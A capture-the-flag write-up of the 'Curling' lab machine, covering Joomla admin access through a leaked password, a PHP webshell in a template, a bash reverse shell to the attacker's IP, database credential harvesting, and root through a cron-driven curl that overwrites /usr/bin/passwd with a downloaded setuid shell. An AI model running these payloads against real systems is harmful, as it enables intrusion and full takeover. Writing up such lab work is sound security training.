
## CTF Writeup: Curling

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.74.77
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-20 07:55 -0500
Nmap scan report for 10.129.74.77
Host is up (0.031s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 8a:d1:69:b4:90:20:3e:a7:b6:54:01:eb:68:30:3a:ca (RSA)
|   256 9f:0b:c2:b2:0b:ad:8f:a1:4e:0b:f6:33:79:ef:fb:43 (ECDSA)
|_  256 c1:2a:35:44:30:0c:5b:56:6a:3f:a5:cc:64:66:d9:a9 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-title: Home
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-generator: Joomla! - Open Source Content Management
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 106.46 seconds
```

The TCP Scan reveals information about an running Joomla CMS.

Upon inspecting the webpage we are being greeted by an Joomla CMS Webpage. The name is "Cewl curling site", since I already am familiar with the tool cewl my intuition tells me that we can create custom wordlists by just cewl'ing the webpage and then bruteforcing the login panel or ssh. Let's try!

But first I'll run an endpoint enumeration scan.

```
feroxbuster --url http://10.129.74.77
```

This provided us with an /administrator endpoint which is the Joomla CMS Login Page.

Utilized the tool cewl in order to crawl the entire website and store the strings inside an passwords.txt file which I will be using for bruteforcing the Joomla CMS Login Page.

```
cewl http://10.129.74.77 -x 15 -o -w passwords.txt
```

Since we'll need the proper parameters and server responses to bruteforce the CMS I'll open up my web proxy tool BurpSuite and intercept the login entry of the /administrator endpoint. 

```
username=^USER^&passwd=^PASSWD^&option=com_login&task=login&return=aW5kZXgucGhw&e2eb6317416518f842e5be9fb0bdeed7=1
```

Before starting bruteforcing I read the blog articles of the CMS and identified two potential usernames. Let's store them inside an users.txt

```
Super User
Floris
```

Trying to bruteforce the /administrator/index.php endpoint didn't work and also the Login Panel on the main webpage only prompted us with false positive's.

```
hydra -L users.txt -P passwords.txt 10.129.74.77 http-post-form "/administrator/index.php:username=^USER^&passwd=^PASSWD^&option=com_login&task=login&return=aW5kZXgucGhw&e2eb6317416518f842e5be9fb0bdeed7=1:F=Username and password do not match or you do not have an account yet."
```

```
hydra -L users.txt -P passwords.txt 10.129.74.77 http-post-form "/index.php:username=^USER^&password=^PASS^&Submit=&option=com_users&task=user.login&return=aHR0cDovLzEwLjEyOS43NC43Ny8%3D&2aaa51ccda95f0a28161e217c9b6870a=1:F=Username and password do not match or you do not have an account yet."
```

 This didn't work. So I decided to enumerate the Version of the Joomla CMS, which I can do inspecting this endpoint:

```
curl 10.129.74.77/administrator/manifests/files/joomla.xml
```

It revealed the 3.8.8 Version of Joomla CMS

But unfortunately I wasn't able to find interesting exploits.

```
searchsploit joomla 3.8
```

I decided to analyze the source code of the webpage and identified an interesting comment at the bottom, which hints at an existing secret.txt file.

```
<!-- secret.txt -->
```

Viewing it in the browser provided us with an base64 encoded string. Let's decode it.

```
echo "Q3VybGluZzIwMTgh" | base64 -d                    
Curling2018!
```

I was able to login into the /administrator endpoint with the following credentials:

```
Floris:Curling2018!
```

From the admin panel, it's simple to get a webshell. I need to find a place I can put php code. I'll do that in the templates, which by definition are going to be code.

1. First I'll go to Extensions > Templates (ignore the sub-menu and click the first Templates):

There it will show the two templates, including the one that's in use, protostar:

2. I'll add a file to the one that's not in use to be a bit stealthier.

3. Click New File:

4. Enter a file name and select a file type php. Hit create. Now I'm taken to an editor. I'll add a simple php webshell and hit save at the top left of the page

The file is now created

5. Went to the file and added the following input and pressed save.

```
<?php SYSTEM($_GET["cmd"]); ?>
```

Now we can access the webshell at the following path:

```
http://10.129.74.77/templates/beez3/media.php?cmd=whoami
```

Started up my listener on port 443.

```
nc -lvnp 443
```

Will utilize the following bash one-liner to get an reverse shell.

```
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.57/443 0>&1'
```

But before trying to run it as an command I'll need to url encode it first. Therefore I'll use https://www.urlencoder.org/ encoded it and ran it to gain RCE as user "www-data".

```
http://10.129.74.77/templates/beez3/media.php?cmd=%2Fbin%2Fbash -c 'bash -i >%26 %2Fdev%2Ftcp%2F10.10.14.57%2F443 0>%261'
```

```
nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.57] from (UNKNOWN) [10.129.74.77] 56622
bash: cannot set terminal process group (1740): Inappropriate ioctl for device
bash: no job control in this shell
www-data@curling:/var/www/html/templates/beez3$
```

Performed Shell Hardening.

```
python3 -c 'import pty;pty.spawn("/bin/bash")'
CTRL + Z
stty raw -echo ; fg ; reset
stty columns 200 rows 200
export TERM=xterm
```

## Privilege Escalation

Navigated into user "floris" home directory and identified an interesting password_backup file, but couldn't retrieve anything useful for now. Also tried to login with the Curling2018! Password which also didn't work.

Enumerated running services on the server and identified an internally running MySQL Database.

```
netstat -tulnp
```

We'll need to get database credentials, let's navigate back to /var/www/html to potentially find them.

Found them in /var/www/html/configuration.php

```
cat configuration.php
<?php
class JConfig {
        public $offline = '0';
        public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
        public $display_offline_message = '1';
        public $offline_image = '';
        public $sitename = 'Cewl Curling site!';
        public $editor = 'tinymce';
        public $captcha = '0';
        public $list_limit = '20';
        public $access = '1';
        public $debug = '0';
        public $debug_lang = '0';
        public $dbtype = 'mysqli';
        public $host = 'localhost';
        public $user = 'floris';
        public $password = 'mYsQ!P4ssw0rd$yea!';
```

Connected to the internal database.

```
mysql -u floris -p
```

Utilized the following queries:

```
show databases;
use Joombla;
show tables;
SELECT * FROM eslfu_users;
```

This provided us with the encrypted password for user "floris".

```
floris:$2y$10$4t3DQSg0DSlKcDEkf1qEcu6nUFEr/gytHfVENwSmZN1MXxE1Ssx.e
```

Stored the hash inside an hash file on my local machine & tried to bruteforce the password out of the hash, but didn't get an hit.

```
john hash --wordlist=/usr/share/wordlists/rockyou.txt
```

I went back to the previously discovered "password_backup" file we were able to read. I stored it inside an file on my local machine and converted it into binary format using an tool called "xxd".

I prompted the output of the password_backup file in AI and it told me it's a bzip2 compressed file.

Converted the hexdump back into binary format.

```
xxd -r hex_format > password_backup.bin
```

Changed file name to the file extension format.

```
mv password_backup.bin password_backup.bz2
```

Unpacked the file and received an "password_backup" file.

```
bunzip2 -k password_backup.bz2
```

As we can see the file is only compressed in gzip now, not in gzip2 anymore.

```
file password_backup    
password_backup: gzip compressed data, was "password", last modified: Tue May 22 19:16:20 2018, from Unix, original size modulo 2^32 141
```

Let's proceed with unpacking this one too. But first we'll need to change the filename to the correct file extension again.

```
mv password_backup password_backup.gz
```

Unpacked the file.

```
gunzip -k password_backup.gz
```

As we can see it now shows bzip2 compressed data, which is absolutely correct!

```
file password_backup
password_backup: bzip2 compressed data, block size = 900k
```

Switch the file extension again.

```
mv password_backup password_backup2.bz2
```

Unzip.

```
bunzip2 -k password_backup2.bz2
```

Now we received the last step, the POSIX tar archive.

```
file password_backup2
password_backup2: POSIX tar archive (GNU)
```

Unpack the file.

```
tar -xf password_backup2
```

Retrieved the password of the floris user.

```
cat password.txt
5d<wdCbdZu)|hChXll
```

Connected to the target server via SSH.

```
ssh floris@10.129.74.77
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
floris@10.129.74.77's password: 
Welcome to Ubuntu 18.04.5 LTS (GNU/Linux 4.15.0-156-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sun Sep 20 14:48:55 UTC 2026

  System load:  0.0               Processes:            178
  Usage of /:   63.7% of 3.87GB   Users logged in:      0
  Memory usage: 28%               IP address for ens33: 10.129.74.77
  Swap usage:   0%


0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


Last login: Wed Sep  8 11:42:07 2021 from 10.10.14.15
floris@curling:~$
```

Retrieved user.txt in /home/floris directory.

```
a6edcce37e9ff97cbf46fed8d2878d87
```

Decided to check out running processes with psspy.

Downloaded it onto the target server.

```
wget http://10.10.14.57/pspy32
```

Gave it executable permissions and ran it:

```
chmod +x pspy32
./pspy32
```

There is an cron running with root permissions.

```
2026/09/20 14:54:01 CMD: UID=0     PID=4912   | curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report                                                         
2026/09/20 14:54:01 CMD: UID=0     PID=4911   | sleep 1 
2026/09/20 14:54:01 CMD: UID=0     PID=4910   | /bin/sh -c curl -K /home/floris/admin-area/input -o /home/floris/admin-area/report                                              
2026/09/20 14:54:01 CMD: UID=0     PID=4909   | /bin/sh -c sleep 1; cat /root/default.txt > /home/floris/admin-area/input
```

It curl's an file in the /home/floris/admin-area directory and stores it inside another file in /home/floris/admin-area. Maybe if we can replace the file which get's curled with an reverse shell we could get root shell. Oh, but we have permission denied.

But we see that we have write permissions on the "input" and "report" files.

```
floris@curling:~/admin-area$ ls -la
total 28
drwxr-x--- 2 root   floris  4096 Aug  2  2022 .
drwxr-xr-x 6 floris floris  4096 Aug  2  2022 ..
-rw-rw---- 1 root   floris    25 Sep 20 15:05 input
-rw-rw---- 1 root   floris 14242 Sep 20 15:05 report
```

Which means we can definitly modify them.

Upon analyzing the script inside /home/floris/admin-area/input, we see that it takes input as an url. Let's modify it so it connects to our python server, downloads an malicious binary and overwrites an binary of our choice e.G passwd.

It should look like this:

```
url = "http://10.10.14.57/setuid"
output = /usr/bin/passwd
```

Let's create our malicious binary which will set /bin/sh as root. Stored the following code inside an "setuid.c" file on my local machine.

```
#include <unistd.h>

void main() {
    setuid(0);
    setgid(0);
    execl("/bin/sh","sh",NULL);
}
```

Compiled the script into binary format.

```
gcc -o setuid setuid.c
```

Started up an python3 webserver inside the directory in which my malicious binary is stored.

```
python3 -m http.server 80
```

Let's now modify the input file using the nano editor.

```
nano input
url = "http://10.10.14.57/setuid"
output = /usr/bin/passwd
```

After the file got downloaded we can simply execute the passwd binary and gain root shell.

```
/usr/bin/passwd
```

Faced an issue in regards of running the binary since the gcc version of which I compiled my script is newer than the current one on the server.

```
/usr/bin/passwd
/usr/bin/passwd: /lib/x86_64-linux-gnu/libc.so.6: version `GLIBC_2.34' not found (required by /usr/bin/passwd)
```

I solved the issue by compiling my script again statically.

```
gcc -static -o setuid setuid.c
```

Started up an python3 webserver inside the directory in which my malicious binary is stored.

```
python3 -m http.server 80
```

Changed the "input" file again in nano.

```
nano input
```

Executed the passwd binary and gained root shell.

```
floris@curling:~/admin-area$ /usr/bin/passwd
#
```

Retrieved root.txt in /root directory.

```
25e6fc20952d70acb0e89e1dd4fc17a1
```